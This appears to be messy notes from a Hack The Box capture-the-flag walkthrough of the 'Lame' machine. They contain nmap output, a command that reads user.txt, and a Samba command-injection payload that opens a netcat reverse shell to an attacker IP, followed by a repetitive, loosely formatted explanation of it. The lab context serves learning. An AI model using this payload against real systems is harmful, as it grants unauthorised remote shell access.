  

```JavaScript
  vsftpd 2.3.4
  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
  smbd 3.0.20-Debian 
  Samba 3.0.20-Debian
  find . -name user.txt -exec cat {} \;
  
```

  

```JavaScript
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.16.12 4444`" 

```

The command `logon "./=`nohup nc -e /bin/sh 10.10.16.12 4444`"` attempts to exploit a vulnerability in an SMB server by executing a reverse shell using netcat. This type of attack is known as command injection. Here's a breakdown of what this command does:

- `**logon "./=**`**nohup nc -e /bin/sh 10.10.16.12 4444**`**"**`: This command tries to log on to the SMB server with a specially crafted username that includes a command injection payload.
- `**nohup nc -e /bin/sh 10.10.16.12 4444**`: This is the payload that gets executed on the target server:
    - `**nohup**`: This command allows the command to continue running in the background even after the user has logged out.
    - `**nc -e /bin/sh 10.10.16.12 4444**`: This uses netcat to open a reverse shell:
        
        - `**nc**`: The netcat utility, often referred to as the "Swiss Army knife" of networking, is used for reading from and writing to network connections using TCP or UDP.
        - `**e /bin/sh**`: Executes the shell.
        - `**10.10.16.12**`: The attacker's IP address where the reverse shell will connect.
        - `**4444**`: The port on the attacker's machine to connect to.
        
        1. `**logon "./=**`: This part of the command is used to inject the payload into the SMB server. The `logon` command is used within `smbclient` to authenticate with the SMB server. The string `"./="` is a specially crafted username that includes the command injection payload.
        2. ``**`nohup nc -e /bin/sh 10.10.16.12 4444`**``: This is a command substitution in Unix-like shells. Anything within the backticks (`` `...` ``) is executed by the shell, and the output is substituted in place. Here’s a breakdown of the command inside the backticks:
            - `**nohup**`: This command is used to run another command in the background, ignoring hangup signals. It allows the command to continue running after the user logs out.
            - `**nc -e /bin/sh 10.10.16.12 4444**`: This part uses netcat to create a reverse shell:
                - **++__++**`**nc**`: Netcat command, used for networking tasks.
                - `**e /bin/sh**`: Executes the shell `/bin/sh` when the connection is made.
                - `**10.10.16.12**`: The attacker's IP address where the reverse shell will connect.
                - `**4444**`: The port on the attacker's machine to connect to.
        

  

  

Not shown: 996 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 2.3.4  
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to 10.10.16.12  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| vsFTPd 2.3.4 - secure, fast, stable  
|_End of status_  
_22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)_  
_| ssh-hostkey:_  
_| 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)_  
_|_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)  
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

_++_Host script results:  
|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 19s_  
_| smb-os-discovery:_  
_| OS: Unix (Samba 3.0.20-Debian)_  
_| Computer name: lame_  
_| NetBIOS computer name:_  
_| Domain name: [hackthebox.gr](http://hackthebox.gr/)_  
_| FQDN: [lame.hackthebox.gr](http://lame.hackthebox.gr/)_  
_|_ System time: 2024-07-06T13:20:37-04:00  
|_smb2-time: Protocol negotiation failed (SMB2)_  
_| smb-security-mode:_  
_| account_used: guest_  
_| authentication_level: user_  
_| challenge_response: supported_  
_|_ message_signing: disabled (dangerous, but default)

  

  

  

  

_**+**__+++++++++